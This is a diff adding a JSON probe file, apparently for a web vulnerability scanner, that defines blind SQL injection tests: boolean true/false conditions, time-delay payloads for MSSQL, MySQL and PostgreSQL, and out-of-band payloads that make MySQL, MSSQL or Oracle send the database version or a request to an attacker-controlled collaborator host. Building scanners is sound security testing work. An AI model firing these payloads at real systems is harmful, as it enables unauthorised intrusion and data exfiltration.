@@ -1,0 +1,206 @@
+{
+  "category": "sqli_blind",
+  "description": " \u2014 blind variants (boolean / time / OOB exfil)",
+  "contexts": {
+    "blind_boolean": {
+      "description": "Boolean-based blind SQL injection \u2014 detects by response content differences",
+      "tech_match": [],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "user_id",
+        "cat",
+        "item_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}} AND 1=1",
+          "description": "Boolean true condition (should return same as baseline) \u2014 establishes true-case for differential with AND 1=2",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "error",
+                "syntax",
+                "exception"
+              ]
+            }
+          ],
+          "severity": "info",
+          "confidence_boost": 0,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=2",
+          "description": "Boolean false condition (should differ from baseline if injectable)",
+          "matchers": [
+            {
+              "type": "word_count_diff",
+              "min_diff": 3
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND '1'='1",
+          "description": "String-context boolean true",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "severity": "info",
+          "confidence_boost": 10,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND '1'='2",
+          "description": "String-context boolean false (different response = blind SQLi)",
+          "matchers": [
+            {
+              "type": "word_count_diff",
+              "min_diff": 3
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
+    "blind_time": {
+      "description": "Time-based blind SQL injection with differential timing",
+      "tech_match": [],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "user_id",
+        "cat"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}; WAITFOR DELAY '0:0:3'--",
+          "description": "MSSQL time-based blind (3 second delay) \u2014 timing must exceed 2800ms to reduce false positives from slow servers",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 2800
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND SLEEP(3)-- -",
+          "description": "MySQL time-based blind (3 second delay) \u2014 timing must exceed 2800ms to reduce false positives from slow servers",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 2800
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT pg_sleep(3)--",
+          "description": "PostgreSQL time-based blind (3 second delay) \u2014 timing must exceed 2800ms to reduce false positives from slow servers",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 2800
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
+    "oob_exfil": {
+      "description": "Out-of-band SQL injection via DNS exfiltration -- uses database-specific functions to trigger DNS lookups to attacker-controlled domain (requires Collaborator)",
+      "tech_match": [
+        "MySQL",
+        "MSSQL",
+        "Oracle"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{{collaborator}}\\\\a'))-- -",
+          "description": "MySQL OOB via LOAD_FILE -- triggers DNS lookup with version() as subdomain to Collaborator (requires FILE privilege)",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "protocol": "dns"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'; EXEC master..xp_dirtree '\\\\{{collaborator}}\\a'--",
+          "description": "MSSQL OOB via xp_dirtree -- triggers SMB/DNS lookup to Collaborator domain",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "protocol": "dns"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND 1=UTL_HTTP.REQUEST('http://{{collaborator}}/oob')--",
+          "description": "Oracle OOB via UTL_HTTP.REQUEST -- triggers HTTP request to Collaborator (requires ACL permission)",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "protocol": "http"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
